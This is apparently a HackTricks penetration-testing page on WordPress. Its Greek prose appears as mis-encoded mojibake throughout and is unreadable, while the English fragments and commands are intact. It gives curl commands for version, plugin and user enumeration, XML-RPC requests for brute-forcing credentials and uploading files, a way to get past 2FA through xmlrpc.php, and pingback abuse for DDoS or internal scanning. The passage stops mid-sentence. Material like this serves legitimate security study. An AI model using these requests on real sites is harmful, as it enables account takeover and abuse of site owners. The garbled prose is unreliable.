# Wordpress

{{#include ../../banners/hacktricks-training.md}}

## Î’Î±ÏƒÎ¹ÎºÎ­Ï‚ Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚

- **Uploaded** files go to: `http://10.10.10.10/wp-content/uploads/2018/08/a.txt`
- **Themes files can be found in /wp-content/themes/,** Î¿Ï€ÏŒÏ„Îµ Î±Î½ Î±Î»Î»Î¬Î¾ÎµÏ„Îµ ÎºÎ¬Ï€Î¿Î¹Î± php Ï„Î¿Ï… theme Î³Î¹Î± Î½Î± Ï€ÎµÏ„ÏÏ‡ÎµÏ„Îµ RCE Ï€Î¹Î¸Î±Î½ÏŒÎ½ Î¸Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ path. Î“Î¹Î± Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î±: Using **theme twentytwelve** you can **access** the **404.php** file in: [**/wp-content/themes/twentytwelve/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- **Another useful url could be:** [**/wp-content/themes/default/404.php**](http://10.11.1.234/wp-content/themes/twentytwelve/404.php)

- Î£Ï„Î¿ **wp-config.php** Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î¿ root password Ï„Î·Ï‚ Î²Î¬ÏƒÎ·Ï‚ Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½.
- Default login paths to check: _**/wp-login.php, /wp-login/, /wp-admin/, /wp-admin.php, /login/**_

### **Main WordPress Files**

- `index.php`
- `license.txt` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï‡ÏÎ®ÏƒÎ¹Î¼ÎµÏ‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ ÏŒÏ€Ï‰Ï‚ Ï„Î·Î½ Î­ÎºÎ´Î¿ÏƒÎ· Ï„Î¿Ï… WordPress Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ ÎµÎ³ÎºÎ±Ï„ÎµÏƒÏ„Î·Î¼Î­Î½Î·.
- `wp-activate.php` Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ Î³Î¹Î± Ï„Î· Î´Î¹Î±Î´Î¹ÎºÎ±ÏƒÎ¯Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚ Î¼Î­ÏƒÏ‰ email ÎºÎ±Ï„Î¬ Ï„Î· Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î¯Î± ÎµÎ½ÏŒÏ‚ Î½Î­Î¿Ï… WordPress site.
- Î¦Î¬ÎºÎµÎ»Î¿Î¹ login (Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î­Ï‡Î¿Ï…Î½ Î¼ÎµÏ„Î¿Î½Î¿Î¼Î±ÏƒÏ„ÎµÎ¯ Î³Î¹Î± Î½Î± ÎºÏÏ…Ï†Ï„Î¿ÏÎ½):
- `/wp-admin/login.php`
- `/wp-admin/wp-login.php`
- `/login.php`
- `/wp-login.php`
- `xmlrpc.php` ÎµÎ¯Î½Î±Î¹ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ Ï€Î¿Ï… Î±Î½Ï„Î¹Ï€ÏÎ¿ÏƒÏ‰Ï€ÎµÏÎµÎ¹ Î¼Î¹Î± Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î± Ï„Î¿Ï… WordPress Ï€Î¿Ï… ÎµÏ€Î¹Ï„ÏÎ­Ï€ÎµÎ¹ Ï„Î· Î¼ÎµÏ„Î¬Î´Î¿ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½ Î¼Îµ HTTP Ï‰Ï‚ Î¼Î­ÏƒÎ¿ Î¼ÎµÏ„Î±Ï†Î¿ÏÎ¬Ï‚ ÎºÎ±Î¹ XML Ï‰Ï‚ Î¼Î·Ï‡Î±Î½Î¹ÏƒÎ¼ÏŒ ÎºÏ‰Î´Î¹ÎºÎ¿Ï€Î¿Î¯Î·ÏƒÎ·Ï‚. Î‘Ï…Ï„ÏŒÏ‚ Î¿ Ï„ÏÏ€Î¿Ï‚ ÎµÏ€Î¹ÎºÎ¿Î¹Î½Ï‰Î½Î¯Î±Ï‚ Î­Ï‡ÎµÎ¹ Î±Î½Ï„Î¹ÎºÎ±Ï„Î±ÏƒÏ„Î±Î¸ÎµÎ¯ Î±Ï€ÏŒ Ï„Î¿ WordPress [REST API](https://developer.wordpress.org/rest-api/reference).
- ÎŸ Ï†Î¬ÎºÎµÎ»Î¿Ï‚ `wp-content` ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÏÏÎ¹Î¿Ï‚ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ plugins ÎºÎ±Î¹ themes.
- `wp-content/uploads/` Î•Î¯Î½Î±Î¹ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ ÏŒÎ»Î± Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± Ï€Î¿Ï… Î±Î½ÎµÎ²Î±Î¯Î½Î¿Ï…Î½ ÏƒÏ„Î·Î½ Ï€Î»Î±Ï„Ï†ÏŒÏÎ¼Î±.
- `wp-includes/` Î‘Ï…Ï„ÏŒÏ‚ ÎµÎ¯Î½Î±Î¹ Î¿ ÎºÎ±Ï„Î¬Î»Î¿Î³Î¿Ï‚ ÏŒÏ€Î¿Ï… Î±Ï€Î¿Î¸Î·ÎºÎµÏÎ¿Î½Ï„Î±Î¹ Ï„Î± core Î±ÏÏ‡ÎµÎ¯Î±, ÏŒÏ€Ï‰Ï‚ Ï€Î¹ÏƒÏ„Î¿Ï€Î¿Î¹Î·Ï„Î¹ÎºÎ¬, Î³ÏÎ±Î¼Î¼Î±Ï„Î¿ÏƒÎµÎ¹ÏÎ­Ï‚, Î±ÏÏ‡ÎµÎ¯Î± JavaScript ÎºÎ±Î¹ widgets.
- `wp-sitemap.xml` Î£Îµ ÎµÎºÎ´ÏŒÏƒÎµÎ¹Ï‚ Wordpress 5.5 ÎºÎ±Î¹ Î¼ÎµÎ³Î±Î»ÏÏ„ÎµÏÎµÏ‚, Ï„Î¿ Worpress Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯ Î­Î½Î± sitemap XML Î±ÏÏ‡ÎµÎ¯Î¿ Î¼Îµ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ Î´Î·Î¼ÏŒÏƒÎ¹ÎµÏ‚ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ Ï„Î± publicly queryable post types ÎºÎ±Î¹ taxonomies.

**Post exploitation**

- Î¤Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ `wp-config.php` Ï€ÎµÏÎ¹Î­Ï‡ÎµÎ¹ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î±Î¹Ï„Î¿ÏÎ½Ï„Î±Î¹ Î±Ï€ÏŒ Ï„Î¿ WordPress Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯ ÏƒÏ„Î· Î²Î¬ÏƒÎ· Î´ÎµÎ´Î¿Î¼Î­Î½Ï‰Î½, ÏŒÏ€Ï‰Ï‚ Ï„Î¿ database name, database host, username ÎºÎ±Î¹ password, authentication keys and salts, ÎºÎ±Î¹ Ï„Î¿ database table prefix. Î‘Ï…Ï„ÏŒ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ ÏÏ…Î¸Î¼Î¯ÏƒÎµÏ‰Î½ Î¼Ï€Î¿ÏÎµÎ¯ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹ Ï„Î¿ DEBUG mode, Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎµÎ¯Î½Î±Î¹ Ï‡ÏÎ®ÏƒÎ¹Î¼Î¿ Î³Î¹Î± troubleshooting.

### Users Permissions

- **Administrator**
- **Editor**: Publish ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î´Î¹ÎºÎ­Ï‚ Ï„Î¿Ï… ÎºÎ±Î¹ Î¬Î»Î»Ï‰Î½ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚
- **Author**: Publish ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î´Î¹ÎºÎ­Ï‚ Ï„Î¿Ï… Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚
- **Contributor**: Î“ÏÎ¬Ï†ÎµÎ¹ ÎºÎ±Î¹ Î´Î¹Î±Ï‡ÎµÎ¹ÏÎ¯Î¶ÎµÏ„Î±Î¹ Ï„Î¹Ï‚ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚ Ï„Î¿Ï… Î±Î»Î»Î¬ Î´ÎµÎ½ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï„Î¹Ï‚ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹
- **Subscriber**: Î ÎµÏÎ¹Î·Î³ÎµÎ¯Ï„Î±Î¹ Ï„Î¹Ï‚ Î´Î·Î¼Î¿ÏƒÎ¹ÎµÏÏƒÎµÎ¹Ï‚ ÎºÎ±Î¹ ÎµÏ€ÎµÎ¾ÎµÏÎ³Î¬Î¶ÎµÏ„Î±Î¹ Ï„Î¿ Ï€ÏÎ¿Ï†Î¯Î» Ï„Î¿Ï…

## **Passive Enumeration**

### **Get WordPress version**

Î•Î»Î­Î³Î¾Ï„Îµ Î±Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ Ï„Î± Î±ÏÏ‡ÎµÎ¯Î± `/license.txt` Î® `/readme.html`

ÎœÎ­ÏƒÎ± ÏƒÏ„Î¿Î½ **Ï€Î·Î³Î±Î¯Î¿ ÎºÏÎ´Î¹ÎºÎ±** Ï„Î·Ï‚ ÏƒÎµÎ»Î¯Î´Î±Ï‚ (Ï€Î±ÏÎ¬Î´ÎµÎ¹Î³Î¼Î± Î±Ï€ÏŒ [https://wordpress.org/support/article/pages/](https://wordpress.org/support/article/pages/)):

- grep
```bash
curl https://victim.com/ | grep 'content="WordPress'
```
- `meta name`

![](<../../images/image (1111).png>)

- Î‘ÏÏ‡ÎµÎ¯Î± ÏƒÏÎ½Î´ÎµÏƒÎ·Ï‚ CSS

![](<../../images/image (533).png>)

- Î‘ÏÏ‡ÎµÎ¯Î± JavaScript

![](<../../images/image (524).png>)

### Î›Î®ÏˆÎ· Ï€ÏÎ¿ÏƒÎ¸Î­Ï„Ï‰Î½
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep -E 'wp-content/plugins/' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Î›Î®ÏˆÎ· Î˜ÎµÎ¼Î¬Ï„Ï‰Î½
```bash
curl -s -X GET https://wordpress.org/support/article/pages/ | grep -E 'wp-content/themes' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2
```
### Î•Î¾Î±Î³Ï‰Î³Î® ÎµÎºÎ´ÏŒÏƒÎµÏ‰Î½ Î³ÎµÎ½Î¹ÎºÎ¬
```bash
curl -H 'Cache-Control: no-cache, no-store' -L -ik -s https://wordpress.org/support/article/pages/ | grep http | grep -E '?ver=' | sed -E 's,href=|src=,THIIIIS,g' | awk -F "THIIIIS" '{print $2}' | cut -d "'" -f2

```
## Î•Î½ÎµÏÎ³Î® Î±Î½Î¯Ï‡Î½ÎµÏ…ÏƒÎ·

### Plugins and Themes

Î Î¹Î¸Î±Î½ÏŒÏ„Î±Ï„Î± Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎ­ÏƒÎµÏ„Îµ Î½Î± Î²ÏÎµÎ¯Ï„Îµ ÏŒÎ»Î± Ï„Î± Plugins ÎºÎ±Î¹ Themes Ï€Î¿Ï… ÎµÎ¯Î½Î±Î¹ Î´Î¹Î±Î¸Î­ÏƒÎ¹Î¼Î±. Î“Î¹Î± Î½Î± Ï„Î± Î±Î½Î±ÎºÎ±Î»ÏÏˆÎµÏ„Îµ ÏŒÎ»Î±, Î¸Î± Ï‡ÏÎµÎ¹Î±ÏƒÏ„ÎµÎ¯ Î½Î± **ÎµÎ½ÎµÏÎ³Î¬ ÎºÎ¬Î½ÎµÏ„Îµ Brute Force ÏƒÎµ Î¼Î¹Î± Î»Î¯ÏƒÏ„Î± Î¼Îµ Plugins ÎºÎ±Î¹ Themes** (ÎµÎ»Ï€Î¯Î¶Î¿Î½Ï„Î±Ï‚ ÏŒÏ„Î¹ Ï…Ï€Î¬ÏÏ‡Î¿Ï…Î½ Î±Ï…Ï„Î¿Î¼Î±Ï„Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î± ÎµÏÎ³Î±Î»ÎµÎ¯Î± Ï€Î¿Ï… Ï€ÎµÏÎ¹Î­Ï‡Î¿Ï…Î½ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ Î»Î¯ÏƒÏ„ÎµÏ‚).

### Î§ÏÎ®ÏƒÏ„ÎµÏ‚

- **ID Brute:** Î Î±Î¯ÏÎ½ÎµÏ„Îµ Î­Î³ÎºÏ…ÏÎ¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Î±Ï€ÏŒ Î­Î½Î± WordPress site ÎºÎ¬Î½Î¿Î½Ï„Î±Ï‚ Brute Forcing ÏƒÏ„Î± user IDs:
```bash
curl -s -I -X GET http://blog.example.com/?author=1
```
Î‘Î½ Î¿Î¹ Î±Ï€Î±Î½Ï„Î®ÏƒÎµÎ¹Ï‚ ÎµÎ¯Î½Î±Î¹ **200** Î® **30X**, Î±Ï…Ï„ÏŒ ÏƒÎ·Î¼Î±Î¯Î½ÎµÎ¹ ÏŒÏ„Î¹ Ï„Î¿ id ÎµÎ¯Î½Î±Î¹ **Î­Î³ÎºÏ…ÏÎ¿**. Î‘Î½ Î· Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· ÎµÎ¯Î½Î±Î¹ **400**, Ï„ÏŒÏ„Îµ Ï„Î¿ id ÎµÎ¯Î½Î±Î¹ **Î¬ÎºÏ…ÏÎ¿**.

- **wp-json:** ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ ÎµÏ€Î¯ÏƒÎ·Ï‚ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÏ„Îµ Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÏƒÏ„Î­Î»Î½Î¿Î½Ï„Î±Ï‚ Î±Î¹Ï„Î®Î¼Î±Ï„Î±:
```bash
curl http://blog.example.com/wp-json/wp/v2/users
```
ÎˆÎ½Î± Î¬Î»Î»Î¿ `/wp-json/` endpoint Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Î±Ï€Î¿ÎºÎ±Î»ÏÏˆÎµÎ¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ ÎµÎ¯Î½Î±Î¹:
```bash
curl http://blog.example.com/wp-json/oembed/1.0/embed?url=POST-URL
```
Î£Î·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ Î±Ï…Ï„ÏŒ Ï„Î¿ endpoint ÎµÎºÎ¸Î­Ï„ÎµÎ¹ Î¼ÏŒÎ½Î¿ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎºÎ¬Î½ÎµÎ¹ post. **Î˜Î± Ï€Î±ÏÎ­Ï‡Î¿Î½Ï„Î±Î¹ Î¼ÏŒÎ½Î¿ Ï€Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Î³Î¹Î± Ï„Î¿Ï…Ï‚ Ï‡ÏÎ®ÏƒÏ„ÎµÏ‚ Ï€Î¿Ï… Î­Ï‡Î¿Ï…Î½ ÎµÎ½ÎµÏÎ³Î¿Ï€Î¿Î¹Î·Î¼Î­Î½Î· Î±Ï…Ï„Î® Ï„Î· Î»ÎµÎ¹Ï„Î¿Ï…ÏÎ³Î¯Î±**.

Î•Ï€Î¯ÏƒÎ·Ï‚ ÏƒÎ·Î¼ÎµÎ¹ÏÏƒÏ„Îµ ÏŒÏ„Î¹ **/wp-json/wp/v2/pages** Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± leak Î´Î¹ÎµÏ…Î¸ÏÎ½ÏƒÎµÎ¹Ï‚ IP.

- **Login username enumeration**: ÎŒÏ„Î±Î½ Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹ÎµÎ¯Ï„Î±Î¹ ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ ÏƒÏ„Î¿ **`/wp-login.php`**, Ï„Î¿ **Î¼Î®Î½Ï…Î¼Î±** ÎµÎ¯Î½Î±Î¹ **Î´Î¹Î±Ï†Î¿ÏÎµÏ„Î¹ÎºÏŒ** Î±Î½Î¬Î»Î¿Î³Î± Î¼Îµ Ï„Î¿ Î±Î½ Ï„Î¿ Î´Î·Î»Ï‰Î¼Î­Î½Î¿ **ÏŒÎ½Î¿Î¼Î± Ï‡ÏÎ®ÏƒÏ„Î·** Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î® ÏŒÏ‡Î¹.

### XML-RPC

Î‘Î½ Ï„Î¿ `xml-rpc.php` ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³ÏŒ, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€ÏÎ±Î³Î¼Î±Ï„Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ credentials brute-force Î® Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Î³Î¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ DoS ÎµÏ€Î¹Î¸Î­ÏƒÎµÎ¹Ï‚ ÏƒÎµ Î¬Î»Î»Î¿Ï…Ï‚ Ï€ÏŒÏÎ¿Ï…Ï‚. (You can automate this process[ using this](https://github.com/relarizky/wpxploit) for example).

Î“Î¹Î± Î½Î± Î´ÎµÎ¯Ï„Îµ Î±Î½ ÎµÎ¯Î½Î±Î¹ ÎµÎ½ÎµÏÎ³ÏŒ, Ï€ÏÎ¿ÏƒÏ€Î±Î¸Î®ÏƒÏ„Îµ Î½Î± Î±Ï€Î¿ÎºÏ„Î®ÏƒÎµÏ„Îµ Ï€ÏÏŒÏƒÎ²Î±ÏƒÎ· ÏƒÏ„Î¿ _**/xmlrpc.php**_ ÎºÎ±Î¹ ÏƒÏ„ÎµÎ¯Î»Ï„Îµ Î±Ï…Ï„ÏŒ Ï„Î¿ Î±Î¯Ï„Î·Î¼Î±:

**ÎˆÎ»ÎµÎ³Ï‡Î¿Ï‚**
```html
<methodCall>
<methodName>system.listMethods</methodName>
<params></params>
</methodCall>
```
![](https://h3llwings.files.wordpress.com/2019/01/list-of-functions.png?w=656)

**Credentials Bruteforce**

`wp.getUserBlogs`, `wp.getCategories` Î® `metaWeblog.getUsersBlogs` ÎµÎ¯Î½Î±Î¹ Î¼ÎµÏÎ¹ÎºÎ­Ï‚ Î±Ï€ÏŒ Ï„Î¹Ï‚ Î¼ÎµÎ¸ÏŒÎ´Î¿Ï…Ï‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎ¿ÏÎ½ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸Î¿ÏÎ½ Î³Î¹Î± brute-force credentials. Î‘Î½ Î²ÏÎµÎ¯Ï„Îµ Î¿Ï€Î¿Î¹Î±Î´Î®Ï€Î¿Ï„Îµ Î±Ï€ÏŒ Î±Ï…Ï„Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÏ„Îµ ÎºÎ¬Ï„Î¹ ÏŒÏ€Ï‰Ï‚:
```html
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param><value>admin</value></param>
<param><value>pass</value></param>
</params>
</methodCall>
```
Î¤Î¿ Î¼Î®Î½Ï…Î¼Î± _"Incorrect username or password"_ Î¼Î­ÏƒÎ± ÏƒÎµ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¼Îµ ÎºÏ‰Î´Î¹ÎºÏŒ 200 Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ Î±Î½ Ï„Î± Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î´ÎµÎ½ ÎµÎ¯Î½Î±Î¹ Î­Î³ÎºÏ…ÏÎ±.

![](<../../images/image (107) (2) (2) (2) (2) (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (2) (4) (1).png>)

![](<../../images/image (721).png>)

Î§ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Ï„Î± ÏƒÏ‰ÏƒÏ„Î¬ Î´Î¹Î±Ï€Î¹ÏƒÏ„ÎµÏ…Ï„Î®ÏÎ¹Î± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î±Î½ÎµÎ²Î¬ÏƒÎµÏ„Îµ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿. Î£Ï„Î·Î½ Î±Ï€Î¬Î½Ï„Î·ÏƒÎ· Î¸Î± ÎµÎ¼Ï†Î±Î½Î¯Î¶ÎµÏ„Î±Î¹ Î· Î´Î¹Î±Î´ÏÎ¿Î¼Î® ([https://gist.github.com/georgestephanis/5681982](https://gist.github.com/georgestephanis/5681982))
```html
<?xml version='1.0' encoding='utf-8'?>
<methodCall>
<methodName>wp.uploadFile</methodName>
<params>
<param><value><string>1</string></value></param>
<param><value><string>username</string></value></param>
<param><value><string>password</string></value></param>
<param>
<value>
<struct>
<member>
<name>name</name>
<value><string>filename.jpg</string></value>
</member>
<member>
<name>type</name>
<value><string>mime/type</string></value>
</member>
<member>
<name>bits</name>
<value><base64><![CDATA[---base64-encoded-data---]]></base64></value>
</member>
</struct>
</value>
</param>
</params>
</methodCall>
```
Î•Ï€Î¯ÏƒÎ·Ï‚ Ï…Ï€Î¬ÏÏ‡ÎµÎ¹ Î­Î½Î±Ï‚ **Î³ÏÎ·Î³Î¿ÏÏŒÏ„ÎµÏÎ¿Ï‚ Ï„ÏÏŒÏ€Î¿Ï‚** Î³Î¹Î± brute-force credentials Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ **`system.multicall`** ÎºÎ±Î¸ÏÏ‚ Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± Î´Î¿ÎºÎ¹Î¼Î¬ÏƒÎµÎ¹Ï‚ Î±ÏÎºÎµÏ„Î¬ credentials ÏƒÏ„Î¿ Î¯Î´Î¹Î¿ request:

<figure><img src="../../images/image (628).png" alt=""><figcaption></figcaption></figure>

**Î Î±ÏÎ¬ÎºÎ±Î¼ÏˆÎ· 2FA**

Î‘Ï…Ï„Î® Î· Î¼Î­Î¸Î¿Î´Î¿Ï‚ Ï€ÏÎ¿Î¿ÏÎ¯Î¶ÎµÏ„Î±Î¹ Î³Î¹Î± Ï€ÏÎ¿Î³ÏÎ¬Î¼Î¼Î±Ï„Î± ÎºÎ±Î¹ ÏŒÏ‡Î¹ Î³Î¹Î± Î±Î½Î¸ÏÏÏ€Î¿Ï…Ï‚, ÎºÎ±Î¹ ÎµÎ¯Î½Î±Î¹ Ï€Î±Î»Î¹Î¬, ÎµÏ€Î¿Î¼Î­Î½Ï‰Ï‚ Î´ÎµÎ½ Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¶ÎµÎ¹ 2FA. ÎˆÏ„ÏƒÎ¹, Î±Î½ Î­Ï‡ÎµÎ¹Ï‚ valid creds Î±Î»Î»Î¬ Î· ÎºÏÏÎ¹Î± ÎµÎ¯ÏƒÎ¿Î´Î¿Ï‚ Ï€ÏÎ¿ÏƒÏ„Î±Ï„ÎµÏÎµÏ„Î±Î¹ Î¼Îµ 2FA, **Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± ÎºÎ±Ï„Î±Ï†Î­ÏÎµÎ¹Ï‚ Î½Î± ÎµÎºÎ¼ÎµÏ„Î±Î»Î»ÎµÏ…Ï„ÎµÎ¯Ï‚ xmlrpc.php Î³Î¹Î± Î½Î± ÏƒÏ…Î½Î´ÎµÎ¸ÎµÎ¯Ï‚ Î¼Îµ Î±Ï…Ï„Î¬ Ï„Î± creds Ï€Î±ÏÎ±ÎºÎ¬Î¼Ï€Ï„Î¿Î½Ï„Î±Ï‚ Ï„Î·Î½ 2FA**. Î£Î·Î¼ÎµÎ¯Ï‰ÏƒÎµ ÏŒÏ„Î¹ Î´ÎµÎ½ Î¸Î± Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÎ¹Ï‚ ÏŒÎ»ÎµÏ‚ Ï„Î¹Ï‚ ÎµÎ½Î­ÏÎ³ÎµÎ¹ÎµÏ‚ Ï€Î¿Ï… Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î¼Î­ÏƒÏ‰ Ï„Î¿Ï… console, Î±Î»Î»Î¬ Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î±ÎºÏŒÎ¼Î± Î½Î± Ï†Ï„Î¬ÏƒÎµÎ¹Ï‚ ÏƒÎµ RCE ÏŒÏ€Ï‰Ï‚ ÎµÎ¾Î·Î³ÎµÎ¯ Î¿ Ippsec ÏƒÏ„Î¿ [https://www.youtube.com/watch?v=p8mIdm93mfw\&t=1130s](https://www.youtube.com/watch?v=p8mIdm93mfw&t=1130s)

**DDoS Î® port scanning**

Î‘Î½ Î²ÏÎµÎ¹Ï‚ Ï„Î· Î¼Î­Î¸Î¿Î´Î¿ _**pingback.ping**_ Î¼Î­ÏƒÎ± ÏƒÏ„Î· Î»Î¯ÏƒÏ„Î± Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± ÎºÎ¬Î½ÎµÎ¹Ï‚ Ï„Î¿ Wordpress Î½Î± ÏƒÏ„ÎµÎ¯Î»ÎµÎ¹ Î­Î½Î± Î±Ï…Î¸Î±Î¯ÏÎµÏ„Î¿ request ÏƒÎµ Î¿Ï€Î¿Î¹Î¿Î´Î®Ï€Î¿Ï„Îµ host/port.\
Î‘Ï…Ï„ÏŒ Î¼Ï€Î¿ÏÎµÎ¯ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î·Î¸ÎµÎ¯ Î³Î¹Î± Î½Î± Î¶Î·Ï„Î®ÏƒÎµÎ¹Ï‚ Î±Ï€ÏŒ **Ï‡Î¹Î»Î¹Î¬Î´ÎµÏ‚** Wordpress **sites** Î½Î± **access** Î¼Î¯Î± **location** (Î¿Ï€ÏŒÏ„Îµ Ï€ÏÎ¿ÎºÎ±Î»ÎµÎ¯Ï„Î±Î¹ **DDoS** ÏƒÎµ Î±Ï…Ï„Î® Ï„Î·Î½ Ï„Î¿Ï€Î¿Î¸ÎµÏƒÎ¯Î±) Î® Î¼Ï€Î¿ÏÎµÎ¯Ï‚ Î½Î± Ï„Î¿ Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÎ¹Ï‚ Î³Î¹Î± Î½Î± ÎºÎ¬Î½ÎµÎ¹Ï‚ Ï„Î¿ **Wordpress** Î½Î± **scan** ÎºÎ¬Ï€Î¿Î¹Î¿ ÎµÏƒÏ‰Ï„ÎµÏÎ¹ÎºÏŒ **network** 